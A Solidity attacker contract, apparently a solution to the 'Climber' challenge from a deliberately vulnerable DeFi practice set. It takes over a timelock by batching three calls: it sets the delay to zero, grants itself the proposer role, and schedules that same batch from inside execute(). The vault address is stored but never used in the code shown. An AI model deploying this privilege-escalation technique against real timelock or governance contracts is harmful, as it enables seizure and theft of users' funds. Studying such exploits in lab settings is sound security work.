//SPDX-License-Identifier: MIT

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.0;

contract ClimberAttacker {

    address owner;

    address payable timeLock;
    address vault;

    constructor (address _timeLock, address _vault) {
        owner = msg.sender;
        timeLock = payable(_timeLock);
        vault = _vault;
    }

    function attack() public {
        bytes32 salt = bytes32("pwnd");

        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        //1: set delay to 0
        targets[0] = timeLock;
        values[0] = uint256(0);
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0); //set execution delay to 0

        //2: set this contract as proposer
        targets[1] = timeLock;
        values[1] = uint256(0);
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this)); //set this contract as admin

        //3: now that I am a proposer, I can schedule the 2 previous actions in the timelock so that they can be executed
        targets[2] = address(this);
        values[2] = uint256(0);
        dataElements[2] = abi.encodeWithSelector(this.schedule.selector); 

        //4: I send these actions for execution
        ClimberTimelock(timeLock).execute(targets, values, dataElements, salt);

        
    }

    function schedule() public {
        bytes32 salt = bytes32("pwnd");

        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        //1: set delay to 0
        targets[0] = timeLock;
        values[0] = uint256(0);
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0); //set execution delay to 0

        //2: set this contract as proposer
        targets[1] = timeLock;
        values[1] = uint256(0);
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this)); //set this contract as admin

        targets[2] = address(this);
        values[2] = uint256(0);
        dataElements[2] = abi.encodeWithSelector(this.schedule.selector); 

        //3: I send these actions for execution
        ClimberTimelock(timeLock).schedule(targets, values, dataElements, salt);
    }

}